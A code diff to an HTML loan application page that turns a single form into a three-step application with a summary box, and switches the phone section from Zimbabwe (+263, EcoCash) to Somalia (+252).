@@ -58,24 +58,104 @@
 
         <!-- Screen 2: Loan Application Details -->
         <div id="application-screen" class="screen dark-theme hidden">
-            <div class="header">
-                <h2>Loan Application</h2>
-                <p>Please enter your details to apply for a loan.</p>
-            </div>
-            <div class="form-container">
-                <div class="input-group">
-                    <input type="text" id="name-input" class="form-input" placeholder="Full Name">
-                </div>
-                <div class="input-group">
-                    <input type="text" id="id-input" class="form-input" placeholder="National ID (e.g. 12-345678X90)">
-                </div>
-                <div class="input-group">
-                    <input type="number" id="amount-input" class="form-input" placeholder="Requested Amount ($)">
+            <div class="header" style="text-align: center; margin-bottom: 20px;">
+                <h2 style="font-size: 24px; font-weight: 700;">Loan Application</h2>
+                <p id="step-text" style="font-size: 14px; margin-top: 8px; color: #9aa0a6;">Step 1 of 3</p>
+                <div class="step-indicators" style="display: flex; justify-content: center; gap: 8px; margin-top: 16px;">
+                    <div class="step-dot active" id="dot-1" style="width: 30px; height: 4px; background: #6f5cc3; border-radius: 2px;"></div>
+                    <div class="step-dot" id="dot-2" style="width: 30px; height: 4px; background: #333; border-radius: 2px;"></div>
+                    <div class="step-dot" id="dot-3" style="width: 30px; height: 4px; background: #333; border-radius: 2px;"></div>
                 </div>
             </div>
-            <div class="bottom-container">
-                <button id="btn-next-application" class="primary-btn disabled" disabled>Next</button>
-                <p class="version">Version 12.4.0890 (1200040890)</p>
+            <div class="form-container" style="display: flex; flex-direction: column; overflow-y: auto;">
+                <!-- Step 1 -->
+                <div id="app-step-1">
+                    <label class="form-label">Loan Type</label>
+                    <div class="input-group">
+                        <select id="loan-type" class="form-input">
+                            <option value="Personal Loan">Personal Loan</option>
+                            <option value="Business Loan">Business Loan</option>
+                        </select>
+                    </div>
+                    <label class="form-label">Loan Amount ($)</label>
+                    <div class="input-group">
+                        <input type="number" id="loan-amount" class="form-input" placeholder="Enter amount">
+                    </div>
+                    <label class="form-label">Loan Term</label>
+                    <div class="input-group">
+                        <select id="loan-term" class="form-input">
+                            <option value="12 Months">12 Months</option>
+                            <option value="24 Months">24 Months</option>
+                        </select>
+                    </div>
+                    <label class="form-label">Purpose of Loan</label>
+                    <div class="input-group">
+                        <input type="text" id="loan-purpose" class="form-input" placeholder="What will you use the loan for?">
+                    </div>
+                </div>
+
+                <!-- Step 2 -->
+                <div id="app-step-2" class="hidden">
+                    <div style="display: flex; gap: 16px;">
+                        <div style="flex: 1;">
+                            <label class="form-label">First Name</label>
+                            <div class="input-group">
+                                <input type="text" id="first-name" class="form-input" placeholder="First Name">
+                            </div>
+                        </div>
+                        <div style="flex: 1;">
+                            <label class="form-label">Last Name</label>
+                            <div class="input-group">
+                                <input type="text" id="last-name" class="form-input" placeholder="Last Name">
+                            </div>
+                        </div>
+                    </div>
+                    <label class="form-label">Email Address</label>
+                    <div class="input-group">
+                        <input type="email" id="email-address" class="form-input" placeholder="Email Address">
+                    </div>
+                </div>
+
+                <!-- Step 3 -->
+                <div id="app-step-3" class="hidden">
+                    <label class="form-label">Employment Status</label>
+                    <div class="input-group">
+                        <select id="emp-status" class="form-input">
+                            <option value="Employed">Employed</option>
+                            <option value="Self-Employed">Self-Employed</option>
+                            <option value="Unemployed">Unemployed</option>
+                        </select>
+                    </div>
+                    <label class="form-label">Annual Income ($)</label>
+                    <div class="input-group">
+                        <input type="number" id="annual-income" class="form-input" placeholder="Annual Income">
+                    </div>
+                    
+                    <div class="summary-box" style="background: rgba(255,255,255,0.05); padding: 16px; border-radius: 8px; margin-top: 16px;">
+                        <h3 style="font-size: 16px; margin-bottom: 16px; font-weight: 600;">Application Summary</h3>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;">
+                            <span style="color: #9aa0a6;">Loan Amount:</span>
+                            <span id="sum-amount" style="font-weight: 600;">$0</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;">
+                            <span style="color: #9aa0a6;">Loan Term:</span>
+                            <span id="sum-term" style="font-weight: 600;">12 Months</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px;">
+                            <span style="color: #9aa0a6;">Purpose:</span>
+                            <span id="sum-purpose" style="font-weight: 600;">-</span>
+                        </div>
+                        <div style="display: flex; justify-content: space-between; font-size: 14px;">
+                            <span style="color: #9aa0a6;">Applicant:</span>
+                            <span id="sum-applicant" style="font-weight: 600;">-</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="bottom-container" style="display: flex; gap: 16px; margin-top: 24px;">
+                <button id="btn-prev-step" class="secondary-btn hidden" style="flex: 1; padding: 16px; border-radius: 8px; background: #e0e0e0; color: #333; border: none; font-weight: 600; cursor: pointer;">PREVIOUS</button>
+                <button id="btn-next-step" class="primary-btn" style="flex: 1; padding: 16px; border-radius: 8px; background: #6f5cc3; color: white; border: none; font-weight: 600; cursor: pointer;">NEXT STEP</button>
             </div>
         </div>
 
@@ -88,13 +168,13 @@
             <div class="form-container">
                 <div class="input-group">
                     <div class="dropdown-item">
-                        <span>Zimbabwe</span>
+                        <span>Somalia</span>
                         <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#9aa0a6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18l6-6-6-6"/></svg>
                     </div>
                 </div>
                 <div class="input-group phone-input-group">
-                    <span class="prefix">(+263)</span>
-                    <input type="tel" id="phone-input" class="form-input" placeholder="EcoCash Number">
+                    <span class="prefix">(+252)</span>
+                    <input type="tel" id="phone-input" class="form-input" placeholder="Phone Number">
                 </div>
                 <div class="help-link">
                     <a href="#">Need help?</a>
